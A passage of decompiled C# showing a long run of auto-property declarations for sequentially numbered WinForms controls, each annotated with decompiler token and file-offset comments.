		// (get) Token: 0x060006C9 RID: 1737 RVA: 0x00027D22 File Offset: 0x00025F22
		// (set) Token: 0x060006CA RID: 1738 RVA: 0x00027D2A File Offset: 0x00025F2A
		internal virtual ListBox ListBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000358 RID: 856
		// (get) Token: 0x060006CB RID: 1739 RVA: 0x00027D33 File Offset: 0x00025F33
		// (set) Token: 0x060006CC RID: 1740 RVA: 0x00027D3B File Offset: 0x00025F3B
		internal virtual CheckBox CheckBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000359 RID: 857
		// (get) Token: 0x060006CD RID: 1741 RVA: 0x00027D44 File Offset: 0x00025F44
		// (set) Token: 0x060006CE RID: 1742 RVA: 0x00027D4C File Offset: 0x00025F4C
		internal virtual CheckedListBox CheckedListBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035A RID: 858
		// (get) Token: 0x060006CF RID: 1743 RVA: 0x00027D55 File Offset: 0x00025F55
		// (set) Token: 0x060006D0 RID: 1744 RVA: 0x00027D5D File Offset: 0x00025F5D
		internal virtual Button Button20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035B RID: 859
		// (get) Token: 0x060006D1 RID: 1745 RVA: 0x00027D66 File Offset: 0x00025F66
		// (set) Token: 0x060006D2 RID: 1746 RVA: 0x00027D6E File Offset: 0x00025F6E
		internal virtual ProgressBar ProgressBar41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035C RID: 860
		// (get) Token: 0x060006D3 RID: 1747 RVA: 0x00027D77 File Offset: 0x00025F77
		// (set) Token: 0x060006D4 RID: 1748 RVA: 0x00027D7F File Offset: 0x00025F7F
		internal virtual ProgressBar ProgressBar42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035D RID: 861
		// (get) Token: 0x060006D5 RID: 1749 RVA: 0x00027D88 File Offset: 0x00025F88
		// (set) Token: 0x060006D6 RID: 1750 RVA: 0x00027D90 File Offset: 0x00025F90
		internal virtual DateTimePicker DateTimePicker21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035E RID: 862
		// (get) Token: 0x060006D7 RID: 1751 RVA: 0x00027D99 File Offset: 0x00025F99
		// (set) Token: 0x060006D8 RID: 1752 RVA: 0x00027DA1 File Offset: 0x00025FA1
		internal virtual CheckedListBox CheckedListBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035F RID: 863
		// (get) Token: 0x060006D9 RID: 1753 RVA: 0x00027DAA File Offset: 0x00025FAA
		// (set) Token: 0x060006DA RID: 1754 RVA: 0x00027DB2 File Offset: 0x00025FB2
		internal virtual ListBox ListBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000360 RID: 864
		// (get) Token: 0x060006DB RID: 1755 RVA: 0x00027DBB File Offset: 0x00025FBB
		// (set) Token: 0x060006DC RID: 1756 RVA: 0x00027DC3 File Offset: 0x00025FC3
		internal virtual DateTimePicker DateTimePicker22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000361 RID: 865
		// (get) Token: 0x060006DD RID: 1757 RVA: 0x00027DCC File Offset: 0x00025FCC
		// (set) Token: 0x060006DE RID: 1758 RVA: 0x00027DD4 File Offset: 0x00025FD4
		internal virtual ListBox ListBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000362 RID: 866
		// (get) Token: 0x060006DF RID: 1759 RVA: 0x00027DDD File Offset: 0x00025FDD
		// (set) Token: 0x060006E0 RID: 1760 RVA: 0x00027DE5 File Offset: 0x00025FE5
		internal virtual Label Label11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000363 RID: 867
		// (get) Token: 0x060006E1 RID: 1761 RVA: 0x00027DEE File Offset: 0x00025FEE
		// (set) Token: 0x060006E2 RID: 1762 RVA: 0x00027DF6 File Offset: 0x00025FF6
		internal virtual MaskedTextBox MaskedTextBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000364 RID: 868
		// (get) Token: 0x060006E3 RID: 1763 RVA: 0x00027DFF File Offset: 0x00025FFF
		// (set) Token: 0x060006E4 RID: 1764 RVA: 0x00027E07 File Offset: 0x00026007
		internal virtual RadioButton RadioButton21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000365 RID: 869
		// (get) Token: 0x060006E5 RID: 1765 RVA: 0x00027E10 File Offset: 0x00026010
		// (set) Token: 0x060006E6 RID: 1766 RVA: 0x00027E18 File Offset: 0x00026018
		internal virtual PictureBox PictureBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000366 RID: 870
		// (get) Token: 0x060006E7 RID: 1767 RVA: 0x00027E21 File Offset: 0x00026021
		// (set) Token: 0x060006E8 RID: 1768 RVA: 0x00027E29 File Offset: 0x00026029
		internal virtual MaskedTextBox MaskedTextBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000367 RID: 871
		// (get) Token: 0x060006E9 RID: 1769 RVA: 0x00027E32 File Offset: 0x00026032
		// (set) Token: 0x060006EA RID: 1770 RVA: 0x00027E3A File Offset: 0x0002603A
		internal virtual WebBrowser WebBrowser11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000368 RID: 872
		// (get) Token: 0x060006EB RID: 1771 RVA: 0x00027E43 File Offset: 0x00026043
		// (set) Token: 0x060006EC RID: 1772 RVA: 0x00027E4B File Offset: 0x0002604B
		internal virtual TreeView TreeView11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000369 RID: 873
		// (get) Token: 0x060006ED RID: 1773 RVA: 0x00027E54 File Offset: 0x00026054
		// (set) Token: 0x060006EE RID: 1774 RVA: 0x00027E5C File Offset: 0x0002605C
		internal virtual PictureBox PictureBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036A RID: 874
		// (get) Token: 0x060006EF RID: 1775 RVA: 0x00027E65 File Offset: 0x00026065
		// (set) Token: 0x060006F0 RID: 1776 RVA: 0x00027E6D File Offset: 0x0002606D
		internal virtual NumericUpDown NumericUpDown11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036B RID: 875
		// (get) Token: 0x060006F1 RID: 1777 RVA: 0x00027E76 File Offset: 0x00026076
		// (set) Token: 0x060006F2 RID: 1778 RVA: 0x00027E7E File Offset: 0x0002607E
		internal virtual ProgressBar ProgressBar43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036C RID: 876
		// (get) Token: 0x060006F3 RID: 1779 RVA: 0x00027E87 File Offset: 0x00026087
		// (set) Token: 0x060006F4 RID: 1780 RVA: 0x00027E8F File Offset: 0x0002608F
		internal virtual RadioButton RadioButton22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036D RID: 877
		// (get) Token: 0x060006F5 RID: 1781 RVA: 0x00027E98 File Offset: 0x00026098
		// (set) Token: 0x060006F6 RID: 1782 RVA: 0x00027EA0 File Offset: 0x000260A0
		internal virtual LinkLabel LinkLabel31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036E RID: 878
		// (get) Token: 0x060006F7 RID: 1783 RVA: 0x00027EA9 File Offset: 0x000260A9
		// (set) Token: 0x060006F8 RID: 1784 RVA: 0x00027EB1 File Offset: 0x000260B1
		internal virtual CheckBox CheckBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036F RID: 879
		// (get) Token: 0x060006F9 RID: 1785 RVA: 0x00027EBA File Offset: 0x000260BA
		// (set) Token: 0x060006FA RID: 1786 RVA: 0x00027EC2 File Offset: 0x000260C2
		internal virtual ComboBox ComboBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000370 RID: 880
		// (get) Token: 0x060006FB RID: 1787 RVA: 0x00027ECB File Offset: 0x000260CB
		// (set) Token: 0x060006FC RID: 1788 RVA: 0x00027ED3 File Offset: 0x000260D3
		internal virtual Button Button21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000371 RID: 881
		// (get) Token: 0x060006FD RID: 1789 RVA: 0x00027EDC File Offset: 0x000260DC
		// (set) Token: 0x060006FE RID: 1790 RVA: 0x00027EE4 File Offset: 0x000260E4
		internal virtual ToolTip ToolTip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000372 RID: 882
		// (get) Token: 0x060006FF RID: 1791 RVA: 0x00027EED File Offset: 0x000260ED
		// (set) Token: 0x06000700 RID: 1792 RVA: 0x00027EF5 File Offset: 0x000260F5
		internal virtual NotifyIcon NotifyIcon2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000373 RID: 883
		// (get) Token: 0x06000701 RID: 1793 RVA: 0x00027EFE File Offset: 0x000260FE
		// (set) Token: 0x06000702 RID: 1794 RVA: 0x00027F06 File Offset: 0x00026106
		internal virtual CheckedListBox CheckedListBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000374 RID: 884
		// (get) Token: 0x06000703 RID: 1795 RVA: 0x00027F0F File Offset: 0x0002610F
		// (set) Token: 0x06000704 RID: 1796 RVA: 0x00027F17 File Offset: 0x00026117
		internal virtual ComboBox ComboBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000375 RID: 885
		// (get) Token: 0x06000705 RID: 1797 RVA: 0x00027F20 File Offset: 0x00026120
		// (set) Token: 0x06000706 RID: 1798 RVA: 0x00027F28 File Offset: 0x00026128
		internal virtual MonthCalendar MonthCalendar22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000376 RID: 886
		// (get) Token: 0x06000707 RID: 1799 RVA: 0x00027F31 File Offset: 0x00026131
		// (set) Token: 0x06000708 RID: 1800 RVA: 0x00027F39 File Offset: 0x00026139
		internal virtual MonthCalendar MonthCalendar23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000377 RID: 887
		// (get) Token: 0x06000709 RID: 1801 RVA: 0x00027F42 File Offset: 0x00026142
		// (set) Token: 0x0600070A RID: 1802 RVA: 0x00027F4A File Offset: 0x0002614A
		internal virtual LinkLabel LinkLabel32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000378 RID: 888
		// (get) Token: 0x0600070B RID: 1803 RVA: 0x00027F53 File Offset: 0x00026153
		// (set) Token: 0x0600070C RID: 1804 RVA: 0x00027F5B File Offset: 0x0002615B
		internal virtual ProgressBar ProgressBar44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000379 RID: 889
		// (get) Token: 0x0600070D RID: 1805 RVA: 0x00027F64 File Offset: 0x00026164
		// (set) Token: 0x0600070E RID: 1806 RVA: 0x00027F6C File Offset: 0x0002616C
		internal virtual LinkLabel LinkLabel33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037A RID: 890
		// (get) Token: 0x0600070F RID: 1807 RVA: 0x00027F75 File Offset: 0x00026175
		// (set) Token: 0x06000710 RID: 1808 RVA: 0x00027F7D File Offset: 0x0002617D
		internal virtual ListBox ListBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037B RID: 891
		// (get) Token: 0x06000711 RID: 1809 RVA: 0x00027F86 File Offset: 0x00026186
		// (set) Token: 0x06000712 RID: 1810 RVA: 0x00027F8E File Offset: 0x0002618E
		internal virtual CheckBox CheckBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037C RID: 892
		// (get) Token: 0x06000713 RID: 1811 RVA: 0x00027F97 File Offset: 0x00026197
		// (set) Token: 0x06000714 RID: 1812 RVA: 0x00027F9F File Offset: 0x0002619F
		internal virtual CheckedListBox CheckedListBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037D RID: 893
		// (get) Token: 0x06000715 RID: 1813 RVA: 0x00027FA8 File Offset: 0x000261A8
		// (set) Token: 0x06000716 RID: 1814 RVA: 0x00027FB0 File Offset: 0x000261B0
		internal virtual Button Button22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037E RID: 894
		// (get) Token: 0x06000717 RID: 1815 RVA: 0x00027FB9 File Offset: 0x000261B9
		// (set) Token: 0x06000718 RID: 1816 RVA: 0x00027FC1 File Offset: 0x000261C1
		internal virtual ProgressBar ProgressBar45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037F RID: 895
		// (get) Token: 0x06000719 RID: 1817 RVA: 0x00027FCA File Offset: 0x000261CA
		// (set) Token: 0x0600071A RID: 1818 RVA: 0x00027FD2 File Offset: 0x000261D2
		internal virtual ProgressBar ProgressBar46 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000380 RID: 896
		// (get) Token: 0x0600071B RID: 1819 RVA: 0x00027FDB File Offset: 0x000261DB
		// (set) Token: 0x0600071C RID: 1820 RVA: 0x00027FE3 File Offset: 0x000261E3
		internal virtual DateTimePicker DateTimePicker23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000381 RID: 897
		// (get) Token: 0x0600071D RID: 1821 RVA: 0x00027FEC File Offset: 0x000261EC
		// (set) Token: 0x0600071E RID: 1822 RVA: 0x00027FF4 File Offset: 0x000261F4
		internal virtual CheckedListBox CheckedListBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000382 RID: 898
		// (get) Token: 0x0600071F RID: 1823 RVA: 0x00027FFD File Offset: 0x000261FD
		// (set) Token: 0x06000720 RID: 1824 RVA: 0x00028005 File Offset: 0x00026205
		internal virtual ListBox ListBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000383 RID: 899
		// (get) Token: 0x06000721 RID: 1825 RVA: 0x0002800E File Offset: 0x0002620E
		// (set) Token: 0x06000722 RID: 1826 RVA: 0x00028016 File Offset: 0x00026216
		internal virtual DateTimePicker DateTimePicker24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000384 RID: 900
		// (get) Token: 0x06000723 RID: 1827 RVA: 0x0002801F File Offset: 0x0002621F
		// (set) Token: 0x06000724 RID: 1828 RVA: 0x00028027 File Offset: 0x00026227
		internal virtual ListBox ListBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000385 RID: 901
		// (get) Token: 0x06000725 RID: 1829 RVA: 0x00028030 File Offset: 0x00026230
		// (set) Token: 0x06000726 RID: 1830 RVA: 0x00028038 File Offset: 0x00026238
		internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000386 RID: 902
		// (get) Token: 0x06000727 RID: 1831 RVA: 0x00028041 File Offset: 0x00026241
		// (set) Token: 0x06000728 RID: 1832 RVA: 0x00028049 File Offset: 0x00026249
		internal virtual MaskedTextBox MaskedTextBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000387 RID: 903
		// (get) Token: 0x06000729 RID: 1833 RVA: 0x00028052 File Offset: 0x00026252
		// (set) Token: 0x0600072A RID: 1834 RVA: 0x0002805A File Offset: 0x0002625A
		internal virtual RadioButton RadioButton23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000388 RID: 904
		// (get) Token: 0x0600072B RID: 1835 RVA: 0x00028063 File Offset: 0x00026263
		// (set) Token: 0x0600072C RID: 1836 RVA: 0x0002806B File Offset: 0x0002626B
		internal virtual PictureBox PictureBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000389 RID: 905
		// (get) Token: 0x0600072D RID: 1837 RVA: 0x00028074 File Offset: 0x00026274
		// (set) Token: 0x0600072E RID: 1838 RVA: 0x0002807C File Offset: 0x0002627C
		internal virtual MaskedTextBox MaskedTextBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038A RID: 906
		// (get) Token: 0x0600072F RID: 1839 RVA: 0x00028085 File Offset: 0x00026285
		// (set) Token: 0x06000730 RID: 1840 RVA: 0x0002808D File Offset: 0x0002628D
		internal virtual WebBrowser WebBrowser12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038B RID: 907
		// (get) Token: 0x06000731 RID: 1841 RVA: 0x00028096 File Offset: 0x00026296
		// (set) Token: 0x06000732 RID: 1842 RVA: 0x0002809E File Offset: 0x0002629E
		internal virtual TreeView TreeView12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038C RID: 908
		// (get) Token: 0x06000733 RID: 1843 RVA: 0x000280A7 File Offset: 0x000262A7
		// (set) Token: 0x06000734 RID: 1844 RVA: 0x000280AF File Offset: 0x000262AF
		internal virtual PictureBox PictureBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038D RID: 909
		// (get) Token: 0x06000735 RID: 1845 RVA: 0x000280B8 File Offset: 0x000262B8
		// (set) Token: 0x06000736 RID: 1846 RVA: 0x000280C0 File Offset: 0x000262C0
		internal virtual NumericUpDown NumericUpDown12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038E RID: 910
		// (get) Token: 0x06000737 RID: 1847 RVA: 0x000280C9 File Offset: 0x000262C9
		// (set) Token: 0x06000738 RID: 1848 RVA: 0x000280D1 File Offset: 0x000262D1
		internal virtual ProgressBar ProgressBar47 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038F RID: 911
		// (get) Token: 0x06000739 RID: 1849 RVA: 0x000280DA File Offset: 0x000262DA
		// (set) Token: 0x0600073A RID: 1850 RVA: 0x000280E2 File Offset: 0x000262E2
		internal virtual RadioButton RadioButton24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000390 RID: 912
		// (get) Token: 0x0600073B RID: 1851 RVA: 0x000280EB File Offset: 0x000262EB
		// (set) Token: 0x0600073C RID: 1852 RVA: 0x000280F3 File Offset: 0x000262F3
		internal virtual LinkLabel LinkLabel34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000391 RID: 913
		// (get) Token: 0x0600073D RID: 1853 RVA: 0x000280FC File Offset: 0x000262FC
		// (set) Token: 0x0600073E RID: 1854 RVA: 0x00028104 File Offset: 0x00026304
		internal virtual CheckBox CheckBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000392 RID: 914
		// (get) Token: 0x0600073F RID: 1855 RVA: 0x0002810D File Offset: 0x0002630D
		// (set) Token: 0x06000740 RID: 1856 RVA: 0x00028115 File Offset: 0x00026315
		internal virtual ComboBox ComboBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000393 RID: 915
		// (get) Token: 0x06000741 RID: 1857 RVA: 0x0002811E File Offset: 0x0002631E
		// (set) Token: 0x06000742 RID: 1858 RVA: 0x00028126 File Offset: 0x00026326
		internal virtual Button Button23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000394 RID: 916
		// (get) Token: 0x06000743 RID: 1859 RVA: 0x0002812F File Offset: 0x0002632F
		// (set) Token: 0x06000744 RID: 1860 RVA: 0x00028137 File Offset: 0x00026337
		internal virtual CheckedListBox CheckedListBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000395 RID: 917
		// (get) Token: 0x06000745 RID: 1861 RVA: 0x00028140 File Offset: 0x00026340
		// (set) Token: 0x06000746 RID: 1862 RVA: 0x00028148 File Offset: 0x00026348
		internal virtual ComboBox ComboBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000396 RID: 918
		// (get) Token: 0x06000747 RID: 1863 RVA: 0x00028151 File Offset: 0x00026351
		// (set) Token: 0x06000748 RID: 1864 RVA: 0x00028159 File Offset: 0x00026359
		internal virtual MonthCalendar MonthCalendar24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000397 RID: 919
		// (get) Token: 0x06000749 RID: 1865 RVA: 0x00028162 File Offset: 0x00026362
		// (set) Token: 0x0600074A RID: 1866 RVA: 0x0002816A File Offset: 0x0002636A
		internal virtual MonthCalendar MonthCalendar25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000398 RID: 920
		// (get) Token: 0x0600074B RID: 1867 RVA: 0x00028173 File Offset: 0x00026373
		// (set) Token: 0x0600074C RID: 1868 RVA: 0x0002817B File Offset: 0x0002637B
		internal virtual LinkLabel LinkLabel35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000399 RID: 921
		// (get) Token: 0x0600074D RID: 1869 RVA: 0x00028184 File Offset: 0x00026384
		// (set) Token: 0x0600074E RID: 1870 RVA: 0x0002818C File Offset: 0x0002638C
		internal virtual ProgressBar ProgressBar48 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700039A RID: 922
		// (get) Token: 0x0600074F RID: 1871 RVA: 0x00028195 File Offset: 0x00026395
		// (set) Token: 0x06000750 RID: 1872 RVA: 0x0002819D File Offset: 0x0002639D
		internal virtual MonthCalendar MonthCalendar26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700039B RID: 923
		// (get) Token: 0x06000751 RID: 1873 RVA: 0x000281A6 File Offset: 0x000263A6
		// (set) Token: 0x06000752 RID: 1874 RVA: 0x000281AE File Offset: 0x000263AE
		internal virtual LinkLabel LinkLabel36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700039C RID: 924
		// (get) Token: 0x06000753 RID: 1875 RVA: 0x000281B7 File Offset: 0x000263B7
		// (set) Token: 0x06000754 RID: 1876 RVA: 0x000281BF File Offset: 0x000263BF
		internal virtual ListBox ListBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700039D RID: 925
		// (get) Token: 0x06000755 RID: 1877 RVA: 0x000281C8 File Offset: 0x000263C8
		// (set) Token: 0x06000756 RID: 1878 RVA: 0x000281D0 File Offset: 0x000263D0
		internal virtual CheckBox CheckBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700039E RID: 926
		// (get) Token: 0x06000757 RID: 1879 RVA: 0x000281D9 File Offset: 0x000263D9
		// (set) Token: 0x06000758 RID: 1880 RVA: 0x000281E1 File Offset: 0x000263E1
		internal virtual CheckedListBox CheckedListBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700039F RID: 927
		// (get) Token: 0x06000759 RID: 1881 RVA: 0x000281EA File Offset: 0x000263EA
		// (set) Token: 0x0600075A RID: 1882 RVA: 0x000281F2 File Offset: 0x000263F2
		internal virtual Button Button24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A0 RID: 928
		// (get) Token: 0x0600075B RID: 1883 RVA: 0x000281FB File Offset: 0x000263FB
		// (set) Token: 0x0600075C RID: 1884 RVA: 0x00028203 File Offset: 0x00026403
		internal virtual ProgressBar ProgressBar49 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A1 RID: 929
		// (get) Token: 0x0600075D RID: 1885 RVA: 0x0002820C File Offset: 0x0002640C
		// (set) Token: 0x0600075E RID: 1886 RVA: 0x00028214 File Offset: 0x00026414
		internal virtual ProgressBar ProgressBar50 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A2 RID: 930
		// (get) Token: 0x0600075F RID: 1887 RVA: 0x0002821D File Offset: 0x0002641D
		// (set) Token: 0x06000760 RID: 1888 RVA: 0x00028225 File Offset: 0x00026425
		internal virtual DateTimePicker DateTimePicker25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A3 RID: 931
		// (get) Token: 0x06000761 RID: 1889 RVA: 0x0002822E File Offset: 0x0002642E
		// (set) Token: 0x06000762 RID: 1890 RVA: 0x00028236 File Offset: 0x00026436
		internal virtual CheckedListBox CheckedListBox37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A4 RID: 932
		// (get) Token: 0x06000763 RID: 1891 RVA: 0x0002823F File Offset: 0x0002643F
		// (set) Token: 0x06000764 RID: 1892 RVA: 0x00028247 File Offset: 0x00026447
		internal virtual ListBox ListBox37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A5 RID: 933
		// (get) Token: 0x06000765 RID: 1893 RVA: 0x00028250 File Offset: 0x00026450
		// (set) Token: 0x06000766 RID: 1894 RVA: 0x00028258 File Offset: 0x00026458
		internal virtual DateTimePicker DateTimePicker26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A6 RID: 934
		// (get) Token: 0x06000767 RID: 1895 RVA: 0x00028261 File Offset: 0x00026461
		// (set) Token: 0x06000768 RID: 1896 RVA: 0x00028269 File Offset: 0x00026469
		internal virtual ListBox ListBox38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A7 RID: 935
		// (get) Token: 0x06000769 RID: 1897 RVA: 0x00028272 File Offset: 0x00026472
		// (set) Token: 0x0600076A RID: 1898 RVA: 0x0002827A File Offset: 0x0002647A
		internal virtual Label Label13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A8 RID: 936
		// (get) Token: 0x0600076B RID: 1899 RVA: 0x00028283 File Offset: 0x00026483
		// (set) Token: 0x0600076C RID: 1900 RVA: 0x0002828B File Offset: 0x0002648B
		internal virtual MaskedTextBox MaskedTextBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003A9 RID: 937
		// (get) Token: 0x0600076D RID: 1901 RVA: 0x00028294 File Offset: 0x00026494
		// (set) Token: 0x0600076E RID: 1902 RVA: 0x0002829C File Offset: 0x0002649C
		internal virtual RadioButton RadioButton25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003AA RID: 938
		// (get) Token: 0x0600076F RID: 1903 RVA: 0x000282A5 File Offset: 0x000264A5
		// (set) Token: 0x06000770 RID: 1904 RVA: 0x000282AD File Offset: 0x000264AD
		internal virtual PictureBox PictureBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003AB RID: 939
		// (get) Token: 0x06000771 RID: 1905 RVA: 0x000282B6 File Offset: 0x000264B6
		// (set) Token: 0x06000772 RID: 1906 RVA: 0x000282BE File Offset: 0x000264BE
		internal virtual MaskedTextBox MaskedTextBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003AC RID: 940
		// (get) Token: 0x06000773 RID: 1907 RVA: 0x000282C7 File Offset: 0x000264C7
		// (set) Token: 0x06000774 RID: 1908 RVA: 0x000282CF File Offset: 0x000264CF
		internal virtual WebBrowser WebBrowser13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003AD RID: 941
		// (get) Token: 0x06000775 RID: 1909 RVA: 0x000282D8 File Offset: 0x000264D8
		// (set) Token: 0x06000776 RID: 1910 RVA: 0x000282E0 File Offset: 0x000264E0
		internal virtual TreeView TreeView13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003AE RID: 942
		// (get) Token: 0x06000777 RID: 1911 RVA: 0x000282E9 File Offset: 0x000264E9
		// (set) Token: 0x06000778 RID: 1912 RVA: 0x000282F1 File Offset: 0x000264F1
		internal virtual PictureBox PictureBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003AF RID: 943
		// (get) Token: 0x06000779 RID: 1913 RVA: 0x000282FA File Offset: 0x000264FA
		// (set) Token: 0x0600077A RID: 1914 RVA: 0x00028302 File Offset: 0x00026502
		internal virtual NumericUpDown NumericUpDown13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B0 RID: 944
		// (get) Token: 0x0600077B RID: 1915 RVA: 0x0002830B File Offset: 0x0002650B
		// (set) Token: 0x0600077C RID: 1916 RVA: 0x00028313 File Offset: 0x00026513
		internal virtual ProgressBar ProgressBar51 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B1 RID: 945
		// (get) Token: 0x0600077D RID: 1917 RVA: 0x0002831C File Offset: 0x0002651C
		// (set) Token: 0x0600077E RID: 1918 RVA: 0x00028324 File Offset: 0x00026524
		internal virtual RadioButton RadioButton26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B2 RID: 946
		// (get) Token: 0x0600077F RID: 1919 RVA: 0x0002832D File Offset: 0x0002652D
		// (set) Token: 0x06000780 RID: 1920 RVA: 0x00028335 File Offset: 0x00026535
		internal virtual LinkLabel LinkLabel37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B3 RID: 947
		// (get) Token: 0x06000781 RID: 1921 RVA: 0x0002833E File Offset: 0x0002653E
		// (set) Token: 0x06000782 RID: 1922 RVA: 0x00028346 File Offset: 0x00026546
		internal virtual CheckBox CheckBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

